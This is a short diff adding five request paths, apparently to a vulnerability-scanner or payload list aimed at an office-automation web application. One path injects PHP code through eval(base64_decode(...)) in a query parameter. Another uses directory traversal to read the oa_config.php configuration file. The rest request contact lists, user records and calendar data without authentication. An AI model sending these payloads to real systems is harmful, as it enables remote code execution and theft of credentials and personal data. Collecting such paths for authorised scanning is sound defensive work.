@@ -1,0 +1,5 @@
+/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage
+/mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
+/general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay
+/general/userinfo.php?UID=1
+/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
